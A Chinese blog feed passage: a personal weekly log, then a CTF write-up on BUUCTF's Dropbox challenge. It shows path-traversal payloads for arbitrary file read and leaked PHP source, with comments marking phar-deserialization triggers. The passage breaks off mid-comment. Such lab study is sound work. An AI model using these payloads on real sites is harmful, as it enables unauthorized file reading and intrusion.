title="娱乐:"></a>娱乐:</h2><p>1.看了《潜行》</p><p>总结：因为是刘德华演的，所以一直想去看，之前在学校的时候没机会，又遇到期末周，所以等到我有空的时候学校周围的电影院已经都下架了，不过这周在查最近电影的时候发现家周围有个电影院还有，看到的时候超兴奋！！！直接就买了当天电影票就去看了，电影给我的感触很多，虽然电影好像评分不高，但是我看电影从来都是看奔着感悟去的，所以没太在意电影本身怎么样，至少我感悟很多。</p><p>2.明日方舟60抽新出的两个六星全部拿下</p><p>总结：之前最欧的池子就是过年限定池，所以打算将攒的抽都用来抽过年限定池，然后抽出新出的限定后就退游，也算是一种有始有终的浪漫吧（自己觉得），星铁最喜欢的角色就是卡夫卡，所以在抽到卡夫卡后就退游了，抽的时候没有歪，就很nice！！！原神抽到闲云之后也退坑了，闲云也好喜欢，而且居然是歪了刻师傅后10连直接出的，属实给我惊讶到了。这三个游戏都是我大学接触的，都以我最理想的结局结束了与他们的相遇，也算是无悔了，虽然他们确实给我带来了很多的快乐，但是终究无法促进我完成我的目标，所以还是结束与他们的陪伴吧，我要以一人之身抵达我理想的巅峰！！！</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h2><p>我心自浮尘，但求一方净。</p><p>天地降为人，我意逢高处！</p><h2 id="第二周"><a href="#第二周" class="headerlink" title="第二周:"></a>第二周:</h2><h3 id="Todo"><a href="#Todo" class="headerlink" title="Todo:"></a>Todo:</h3><p>1.BUUCTF第三面题目全部刷完(9道题，周一，周二，周三)</p><p>2.[第二届N1CTF Junior]zako复现（周四）</p><p>3.[L3HCTF 2024]intractable problem（周五）</p><p>4.健身4次</p><p>5.完成任务清单内容</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF [CISCN2019 华北赛区 Day1 Web1]Dropbox</title>
    <link href="/2024/02/03/2024-2-3-Dropbox/"/>
    <url>/2024/02/03/2024-2-3-Dropbox/</url>
    
    <content type="html"><![CDATA[<h2 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2><h3 id="登录界面后发现存在文件上传，经过测试只允许上传图片文件"><a href="#登录界面后发现存在文件上传，经过测试只允许上传图片文件" class="headerlink" title="登录界面后发现存在文件上传，经过测试只允许上传图片文件:"></a>登录界面后发现存在文件上传，经过测试只允许上传图片文件:</h3><p><img src="/images/2024-2-3-Dropbox/image-20231122084336631.png" alt="image-20231122084336631"></p><h3 id="存在下载，我们点击以后还是停留于当前的index-php界面，使用BP抓包拦截之后，发现存在download-php："><a href="#存在下载，我们点击以后还是停留于当前的index-php界面，使用BP抓包拦截之后，发现存在download-php：" class="headerlink" title="存在下载，我们点击以后还是停留于当前的index.php界面，使用BP抓包拦截之后，发现存在download.php："></a>存在下载，我们点击以后还是停留于当前的index.php界面，使用BP抓包拦截之后，发现存在download.php：</h3><p><img src="/images/2024-2-3-Dropbox/image-20231122084529636.png" alt="image-20231122084529636"></p><p>在download.php下存在filename传参，下载的文件内容会存在于响应界面中，猜测可以使用该参数实现任意文件读取.</p><h3 id="读取index-php"><a href="#读取index-php" class="headerlink" title="读取index.php:"></a>读取index.php:</h3><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">filename=index.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-Dropbox/image-20231122084805820.png" alt="image-20231122084805820"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">filename=../index.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-Dropbox/image-20231122084840645.png" alt="image-20231122084840645"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">filename=../../index.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-Dropbox/image-20231122090200880.png" alt="image-20231122090200880"></p><h5 id="index-php"><a href="#index-php" class="headerlink" title="index.php:"></a>index.php:</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br><br>&lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>&lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span>&gt;<br>&lt;title&gt;网盘管理&lt;/title&gt;<br><br>&lt;head&gt;<br>    &lt;link href=<span class="hljs-string">&quot;static/css/bootstrap.min.css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;<br>    &lt;link href=<span class="hljs-string">&quot;static/css/panel.css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;<br>    &lt;script src=<span class="hljs-string">&quot;static/js/jquery.min.js&quot;</span>&gt;&lt;/script&gt;<br>    &lt;script src=<span class="hljs-string">&quot;static/js/bootstrap.bundle.min.js&quot;</span>&gt;&lt;/script&gt;<br>    &lt;script src=<span class="hljs-string">&quot;static/js/toast.js&quot;</span>&gt;&lt;/script&gt;<br>    &lt;script src=<span class="hljs-string">&quot;static/js/panel.js&quot;</span>&gt;&lt;/script&gt;<br>&lt;/head&gt;<br><br>&lt;body&gt;<br>    &lt;nav aria-label=<span class="hljs-string">&quot;breadcrumb&quot;</span>&gt;<br>    &lt;ol <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">breadcrumb</span>&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">li</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">breadcrumb</span>-<span class="hljs-title">item</span> <span class="hljs-title">active</span>&quot;&gt;管理面板&lt;/<span class="hljs-title">li</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">li</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">breadcrumb</span>-<span class="hljs-title">item</span> <span class="hljs-title">active</span>&quot;&gt;&lt;<span class="hljs-title">label</span> <span class="hljs-title">for</span>=&quot;<span class="hljs-title">fileInput</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">fileLabel</span>&quot;&gt;上传文件&lt;/<span class="hljs-title">label</span>&gt;&lt;/<span class="hljs-title">li</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">li</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">active</span> <span class="hljs-title">ml</span>-<span class="hljs-title">auto</span>&quot;&gt;&lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>=&quot;#&quot;&gt;你好 &lt;?<span class="hljs-title">php</span> <span class="hljs-title">echo</span> $<span class="hljs-title">_SESSION</span>[&#x27;<span class="hljs-title">username</span>&#x27;]?&gt;&lt;/<span class="hljs-title">a</span>&gt;&lt;/<span class="hljs-title">li</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">ol</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">nav</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">file</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">fileInput</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">hidden</span>&quot;&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">top</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">toast</span>-<span class="hljs-title">container</span>&quot;&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class">&lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class"><span class="hljs-title">include</span> &quot;<span class="hljs-title">class</span>.<span class="hljs-title">php</span>&quot;;</span><br><span class="hljs-class"></span><br><span class="hljs-class">$<span class="hljs-title">a</span> = <span class="hljs-title">new</span> <span class="hljs-title">FileList</span>($<span class="hljs-title">_SESSION</span>[&#x27;<span class="hljs-title">sandbox</span>&#x27;]);</span><br><span class="hljs-class">$<span class="hljs-title">a</span>-&gt;<span class="hljs-title">Name</span>();</span><br><span class="hljs-class">$<span class="hljs-title">a</span>-&gt;<span class="hljs-title">Size</span>();</span><br><span class="hljs-class">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="读取其他php文件源码"><a href="#读取其他php文件源码" class="headerlink" title="读取其他php文件源码:"></a>读取其他php文件源码:</h3><h5 id="class-php"><a href="#class-php" class="headerlink" title="class.php:"></a>class.php:</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$dbaddr</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-variable">$dbuser</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$dbpass</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;dropbox&quot;</span>;<br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$dbaddr</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpass</span>, <span class="hljs-variable">$dbname</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$db</span>;<br>    <span class="hljs-comment">// 类被申请时自动调用，但不影响之后对变量的赋值</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$db</span>;<span class="hljs-comment">//获取全局变量$db</span><br>        <span class="hljs-comment">// 使当前类的$db变量为全局变量$db的值</span><br>        <span class="hljs-variable language_">$this</span>-&gt;db = <span class="hljs-variable">$db</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">user_exist</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br>        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-variable">$username</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">store_result</span>();<br>        <span class="hljs-variable">$count</span> = <span class="hljs-variable">$stmt</span>-&gt;num_rows;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$count</span> === <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add_user</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">user_exist</span>(<span class="hljs-variable">$username</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$password</span> . <span class="hljs-string">&quot;SiAchGHmFx&quot;</span>);<br>        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">&quot;ss&quot;</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">verify_user</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">user_exist</span>(<span class="hljs-variable">$username</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$password</span> . <span class="hljs-string">&quot;SiAchGHmFx&quot;</span>);<br>        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-variable">$username</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_result</span>(<span class="hljs-variable">$expect</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$expect</span>) &amp;&amp; <span class="hljs-variable">$expect</span> === <span class="hljs-variable">$password</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-comment">// 魔术方法用于触发close()函数，$this-&gt;db= new File();</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$results</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$funcs</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;files = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;results = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;funcs = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable">$filenames</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$path</span>);<br><br>        <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$filenames</span>);<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$filenames</span>[<span class="hljs-variable">$key</span>]);<br>        <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-variable">$filenames</span>);<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$filenames</span>[<span class="hljs-variable">$key</span>]);<br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$filenames</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span>) &#123;<br>            <span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();<br>            <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$path</span> . <span class="hljs-variable">$filename</span>);<br>            <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$this</span>-&gt;files, <span class="hljs-variable">$file</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">name</span>()] = <span class="hljs-keyword">array</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$this</span>-&gt;funcs, <span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;files <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">name</span>()][<span class="hljs-variable">$func</span>] = <span class="hljs-variable">$file</span>-&gt;<span class="hljs-variable">$func</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;funcs <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$func</span>) . <span class="hljs-string">&#x27;&lt;/th&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;results <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span> =&gt; <span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;tr&gt;&#x27;</span>;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$value</span>) . <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;<br>            &#125;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$filename</span>) . <span class="hljs-string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/tr&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$table</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 文件类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-comment">// open方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">open</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;filename = <span class="hljs-variable">$filename</span>;<br>        <span class="hljs-comment">// file_exists()函数为危险函数，可以用于触发phar反序列化</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$filename</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 获取文件的文件名</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>    <span class="hljs-comment">// 计算文件的大小，并返回大小带单位</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">size</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$size</span> = <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        <span class="hljs-variable">$units</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27; B&#x27;</span>, <span class="hljs-string">&#x27; KB&#x27;</span>, <span class="hljs-string">&#x27; MB&#x27;</span>, <span class="hljs-string">&#x27; GB&#x27;</span>, <span class="hljs-string">&#x27; TB&#x27;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$size</span> &gt;= <span class="hljs-number">1024</span> &amp;&amp; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">4</span>; <span class="hljs-variable">$i</span>++) <span class="hljs-variable">$size</span> /= <span class="hljs-number">1024</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$size</span>, <span class="hljs-number">2</span>).<span class="hljs-variable">$units</span>[<span class="hljs-variable">$i</span>];<br>    &#125;<br>    <span class="hljs-comment">// 文件删除函数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">detele</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">// unlink函数为危险函数，用于触发phar反序列化</span><br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>    <span class="hljs-comment">// 文件关闭函数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">// file_get_contents()函数可以获取文件的内容，它可以返回内容，所以可以利用该函数返回我们需要的flag文件信息</span><br>        <span class="hljs-comment">// 触发文件打开函数需要调用file类的close()函数，User类的__destruct()魔术方法中调用了该函数</span><br>        <span class="hljs-comment">// flag一般存在于flag.txt文件中或flag.php</span><br>        <span 